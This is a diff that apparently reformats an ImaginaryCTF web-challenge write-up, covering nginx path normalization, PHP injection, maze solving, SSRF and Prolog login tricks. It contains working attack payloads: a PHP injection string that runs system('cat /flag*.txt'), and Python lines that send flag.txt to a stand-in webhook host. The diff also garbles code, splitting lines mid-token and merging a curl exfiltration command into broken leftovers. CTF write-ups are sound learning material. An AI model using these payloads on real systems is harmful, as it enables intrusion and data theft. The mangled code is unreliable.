@@ -17,11 +17,6 @@
 10
 11
 12
-```
-
-
-
-```
 server {
  listen 80 default_server;
  listen [::]:80;
@@ -31,14 +26,10 @@ server {
  if (-f $request_filename) {
  return 404;
  }
- proxy_pass http://localhost:8000;
+ proxy_pass http://localhost:
+8000;
  }
 }
-```
-
-
-
-```
 1
 2
 3
@@ -51,11 +42,6 @@ server {
 10
 11
 12
-```
-
-
-
-```
 └─$ curl http://readme.chal.imaginaryctf.org/
 <!DOCTYPE html>
 <html lang="en">
@@ -64,15 +50,10 @@ server {
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Hello World</title>
 	</head>
-	<body>
+	
  It works!
-	</body>
+	
 </html>
-```
-
-
-
-```
 1
 2
 3
@@ -81,38 +62,18 @@ server {
 6
 7
 8
-```
-
-
-
-```
 └─$ curl http://readme.chal.imaginaryctf.org/index.html
 <html>
 <head><title>404 Not Found</title></head>
-<body>
-<center><h1>404 Not Found</h1></center>
-<hr><center>nginx/1.22.1</center>
-</body>
+
+<h1>404 Not Found</h1>
+<hr>nginx/1.22.1
+
 </html>
-```
-
-
-
-```
 1
 2
-```
-
-
-
-```
-└─$ echo -e "GET /flag.txt\xA0\x0aHTTP/1.1" | nc readme.chal.imaginaryctf.org 80 
+└─$ echo -e "GET /flag.txt\xA0\x0aHTTP/1.1" | nc readme.chal.imaginaryctf.org 80
 ictf{path_normalization_to_the_res
-```
-
-
-
-```
 1
 2
 3
@@ -138,20 +99,15 @@ ictf{path_normalization_to_the_res
 23
 24
 25
-```
-
-
-
-```
 <?php
 
-echo "<p>Welcome to my journal app!</p>";
-echo "<p><a href=/?file=file1.txt>file1.txt</a></p>";
-echo "<p><a href=/?file=file2.txt>file2.txt</a></p>";
-echo "<p><a href=/?file=file3.txt>file3.txt</a></p>";
-echo "<p><a href=/?file=file4.txt>file4.txt</a></p>";
-echo "<p><a href=/?file=file5.txt>file5.txt</a></p>";
-echo "<p>";
+echo "Welcome to my journal app!";
+echo "<a href=/?file=file1.txt>file1.txt</a>";
+echo "<a href=/?file=file2.txt>file2.txt</a>";
+echo "<a href=/?file=file3.txt>file3.txt</a>";
+echo "<a href=/?file=file4.txt>file4.txt</a>";
+echo "<a href=/?file=file5.txt>file5.txt</a>";
+echo "";
 
 if (isset($_GET['file'])) {
  $file = $_GET['file'];
@@ -167,50 +123,23 @@ if (isset($_GET['file'])) {
  }
 }
 
-echo "</p>";
-```
-
-
-
-```
+echo "";
 1
 2
 3
 4
 5
-```
-
-
-
-```
 # URL Encoded
 test%27,%27..%27)%20or%20die(system(%27cat%20/flag*.txt%27));//
 
-# Original 
+# Original
 test','..') or die(system('cat /flag*.txt'));//
-```
-
-
-
-```
 1
 2
 3
 4
-```
-
-
-
-```
 import base64,os
-curl_content=b"<BASE64_CURL_CONTENT"
-open("/tmp/curl","wb").write(curl_content)
-os.system("chmod +x /tmp/curl;/tmp/curl https://<WEBHOOK_SERVER>/?content=`cat flag.txt |base64 -w0`")
-```
-
-
-
-```
+curl_content=b"/?content=`cat flag.txt |base64 -w0`")
 1
 2
 3
@@ -220,11 +149,6 @@ os.system("chmod +x /tmp/curl;/tmp/curl https://<WEBHOOK_SERVER>/?content=`cat f
 7
 8
 9
-```
-
-
-
-```
 # POST Method
 from urllib.request import urlopen, Request
 httprequest = Request('https://<WEBHOOK>/',data=open("flag.txt","r"),method='POST')
@@ -234,33 +158,19 @@ urlopen(httprequest)
 from urllib.request import urlopen, Request
 httprequest = Request('https://<WEBHOOK>/?='+open("flag.txt","r").read())
 urlopen(httprequest)
-```
-
-
-
-```
 1
 2
 3
 4
 5
 6
-```
-
-
-
-```
 require 'sinatra'
 
 # Route for the index page
 get '/' do
- erb :index
+ erb :
+index
 end
-```
-
-
-
-```
 1
 2
 3
@@ -268,11 +178,6 @@ end
 5
 6
 7
-```
-
-
-
-```
 version: '3.3'
 services:
  deployment:
@@ -280,31 +185,22 @@ services:
  build: .
  ports:
  - 10001:80
-```
-
-
-
-```
 1
 2
 3
 4
 5
-```
-
-
-
-```
-└─$ curl -XPOST http://crystals.chal.imaginaryctf.org 
-WEBrick::HTTPStatus::LengthRequired: WEBrick::HTTPStatus::LengthRequired
-	/var/lib/gems/3.0.0/gems/webrick-1.8.1/lib/webrick/httprequest.rb:530:in `read_body'
-	/var/lib/gems/3.0.0/gems/webrick-1.8.1/lib/webrick/httprequest.rb:257:in `body'
+└─$ curl -XPOST http://crystals.chal.imaginaryctf.org
+WEBrick::
+HTTPStatus::
+LengthRequired: WEBrick::
+HTTPStatus::
+LengthRequired
+	/var/lib/gems/3.0.0/gems/webrick-1.8.1/lib/webrick/httprequest.rb:
+530:in `read_body'
+	/var/lib/gems/3.0.0/gems/webrick-1.8.1/lib/webrick/httprequest.rb:
+257:in `body'
 	/var/lib/gems/3.0.0/gems/rackup-2.1.0/lib/rackup/handler/webrick.rb:67:in `block in initialize'
-```
-
-
-
-```
 1
 2
 3
@@ -316,15 +212,11 @@ WEBrick::HTTPStatus::LengthRequired: WEBrick::HTTPStatus::LengthRequired
 9
 10
 11
-```
-
-
-
-```
 # Script
-for chars in '!' '@' '#' '$' '%' '^' '&' '*' '(' ')' '-' '=' '+' '[' ']' '{' '}' ';' ':' '"' "'" '<' '>' ',' '.' '/' '?' '\\' '|' '`'; do echo $chars;echo;curl -ks "http://crystals.chal.imaginaryctf.org/"$chars| grep -i ictf;done
+for chars in '!' '@' '#' '$' '%' '^' '&' '*' '(' ')' '-' '=' '+' '[' ']' '{' '}' ';' ':' '"' "'" '<' '>' ',' '.' '/' '?' '\\' '|' '`'; do echo $chars;echo;
+curl -ks "http://crystals.chal.imaginaryctf.org/"$chars| grep -i ictf;done
 
-# Characters with Bad URI 
+# Characters with Bad URI
 ^
 "
 <
@@ -332,19 +224,9 @@ for chars in '!' '@' '#' '$' '%' '^' '&' '*' '(' ')' '-' '=' '+' '[' ']' '{' '}'
 \
 |
 `
-```
-
-
-
-```
 maze.py = /maze
 app.py = /source
 Dockerfile = /docker
-```
-
-
-
-```
 1
 2
 3
@@ -359,11 +241,6 @@ Dockerfile = /docker
 12
 13
 14
-```
-
-
-
-```
 MAZE_SIZE = 35
 
 @app.route("/<mazeId>")
@@ -373,36 +250,21 @@ def index(mazeId):
  # if our maze ID location equal to this value we can get the flag
  # getloc(mazeId) == (34,34)
  solved=getLoc(mazeId) == (MAZE_SIZE-1, MAZE_SIZE-1)
- return render_template("maze.html", 
- maze=getMaze(mazeId), 
+ return render_template("maze.html",
+ maze=getMaze(mazeId),
  mazeId=mazeId,
  flag=open("flag.txt").read() if solved else ""
  )
-```
-
-
-
-```
 1
 2
 3
 4
 5
-```
-
-
-
-```
 def gen(self):
  ...
  self.set(*([self.size-1]*self.dim), val='F')
  for i in self.neighbors(*([self.size-1]*self.dim)):
  self.set(*i, val='#')
-```
-
-
-
-```
 1
 2
 3
@@ -470,11 +332,6 @@ def gen(self):
 65
 66
 67
-```
-
-
-
-```
 import sys,requests,threading
 from bs4 import BeautifulSoup as bs
 import time
@@ -533,38 +390,24 @@ if __name__ == "__main__":
  if before == after:
  moveLeft()
  moveUp()
- print(getCurrentMaze()) 
+ print(getCurrentMaze())
  print()
  else:
- print(getCurrentMaze()) 
+ print(getCurrentMaze())
  print()
- 
+
  print(requests.get(TARGET,verify=False).text)
-```
-
-
-
-```
 1
 2
 3
 4
 5
-```
-
-
-
-```
-return fetch(new URL(url.pathname + url.search, 'http://localhost:3000/'), {
+return fetch(new URL(url.pathname + url.search, 'http://localhost:
+3000/'), {
  method: req.method,
  headers: req.headers,
  body: req.body
 })
-```
-
-
-
-```
 1
 2
 3
@@ -575,26 +418,17 @@ return fetch(new URL(url.pathname + url.search, 'http://localhost:3000/'), {
 8
 9
 10
-```
-
-
-
-```
 from flask import Flask, redirect
 
 app = Flask(__name__)
 
 @app.route("/", methods=["GET"])
 def index():
- return redirect("http://localhost:3000/flag.txt")	
+ return redirect("http://localhost:
+3000/flag.txt")
 
 if __name__ == '__main__':
  app.run(host="0.0.0.0", port=8080)
-```
-
-
-
-```
 1
 2
 3
@@ -603,11 +437,6 @@ if __name__ == '__main__':
 6
 7
 8
-```
-
-
-
-```
 greet(Request) :-
  http_session_data(username(Username)),
  http_parameters(Request, [
@@ -616,39 +445,19 @@ greet(Request) :-
  ]),
  content_type,
  format(Format, [Greeting, Username]).
-```
-
-
-
-```
 1
 2
 3
 4
 5
-```
-
-
-
-```
 # Original
 format(Format, [Greeting, Username])
 
 # Input: greeting=Hello, format='~w, ~w!'
 format('~w, ~w!', ['Hello', 'guest'])
-```
-
-
-
-```
 edit/0 == will open the editor of server.pl locally (Cannot use remotely I guess?)
 
 listing/0 == lists all predicates defined
-```
-
-
-
-```
 1
 2
 3
@@ -661,11 +470,6 @@ listing/0 == lists all predicates defined
 10
 11
 12
-```
-
-
-
-```
 login(Request) :-
  member(method(post), Request),
  http_read_data(Request, Data, []),
@@ -678,46 +482,21 @@ login(Request) :-
  http_session_assert(username(Username)),
  http_redirect(see_other, '/greet', Request)
  );
-```
-
-
-
-```
 1
 2
 3
 4
-```
-
-
-
-```
 member(guest='password',[guest=guest,'AzureDiamond'=hunter2,admin=AdminPass]).
 
 # Result
 false.
-```
-
-
-
-```
 1
 2
 3
 4
-```
-
-
-
-```
 member(guest=Unknownvariable,[guest=guest,'AzureDiamond'=hunter2,admin=AdminPass]).
 
 # Result
 Unknownvariable = guest . (true?)
-```
-
-
-
-```
 [username=admin,password=Unknownvariable].
 ```
